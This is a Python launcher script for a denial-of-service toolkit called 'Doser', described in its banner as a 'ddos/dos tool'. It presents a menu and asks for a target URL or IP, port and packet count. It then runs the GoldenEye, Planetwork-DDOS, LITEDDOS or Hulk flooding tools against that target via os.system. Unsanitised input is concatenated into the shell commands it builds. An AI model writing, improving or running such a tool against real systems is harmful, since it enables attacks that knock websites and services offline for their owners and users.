import os
import sys


sys.path.append(os.path.join(os.path.dirname(__file__), "..","lib"))

from inputandother_text import *



 
 
terminal_columns_size = os.get_terminal_size().columns
 
 
n = len(sys.argv)
print(n)
if n > 1:
	for i in range(1, n):
		if sys.argv[i] == "-nb":
			banner="TOJAS".center(terminal_columns_size)
				
else:
	banner = banner_maker(sc_name="Doser",description="Usefull ddos/dos tool.",author="Onur Atakan ULUSOY",email="atadogan06@gmail.com")



main_menu_choices = menu_space() + \
menu_maker(menu_number=1,menu_text="GoldenEye")+ \
menu_maker(menu_number=2,menu_text="Planetword-DDOS")+ \
menu_maker(menu_number=3,menu_text="LITEDDOS")+ \
menu_maker(menu_number=4,menu_text="Hulk")+ \
quit_menu_maker(mode="main")




def start():
 os.system("clear")
 print(banner)
 print(main_menu_choices)
 main_menu()

def clear():
	os.system("clear")



def main_menu():
	choices_input = question_maker(mode="main")
	

	if choices_input == str("1"):
		clear()
		print("GOLDENEYE\n".center(terminal_columns_size))
		
		target_url = input("Please enter target url to atack: ")
		
		want_to_other_command = input("""If you want to edit atack details please type "edit-atack" else press any key: """)
		
		if want_to_other_command == str("edit-atack"):
			os.system("python GoldenEye/goldeneye.py -h")
			print(" ")
			added_command = input("Please enter the extra command: ")
			print(" ")
			os.system("python3 GoldenEye/goldeneye.py "+target_url+" "+added_command)
			
			print(" ")
			input("Press any key to continue...")
			start()			
		else:
			print(" ")
			os.system("python3 GoldenEye/goldeneye.py "+target_url)
			
			
	if choices_input == str("2"):
		clear()
		print("PLANETWORK-DDOS\n".center(terminal_columns_size))
		
		target_ip = input("Please enter target ip to atack: ")
		
		target_port = input("Please enter target port to atack: ")
		
		target_packet = input("Please enter target packet to atack: ")
			
		print(" ")
		os.system("python2 Planetwork-DDOS/pntddos.py "+target_ip+" "+target_port +" "+target_packet)
		
		print(" ")
		input("Press any key to continue...")
		start()						
	if choices_input == str("3"):
		clear()
		print("LITEDDOS\n".center(terminal_columns_size))
		
		target_ip = input("Please enter target (ip/domain-name) to atack: ")
		
		target_port = input("Please enter target port to atack: ")
		
		target_packet = input("Please enter target packet to atack: ")
			
		print(" ")
		os.system("python2 LITEDDOS/LITEDDOS.py "+target_ip+" "+target_port +" "+target_packet)
		
		print(" ")
		input("Press any key to continue...")
		start()		
	if choices_input == str("4"):
		clear()
		print("HULK\n".center(terminal_columns_size))
		
		target_url = input("""Please enter target url to atack (you can add "safe" after url, to autoshut after dos): """)
		print(" ")
		os.system("python2 hulk/hulk.py "+target_url)
		
		print(" ")
		input("Press any key to continue...")
		start()	
	elif choices_input == str("0"):
		exit()
	elif choices_input == str(""):
		print(main_menu_choices)
		main_menu()
	else:
		print("invalid option "+str(choices_input))
		main_menu()
		
	




start()
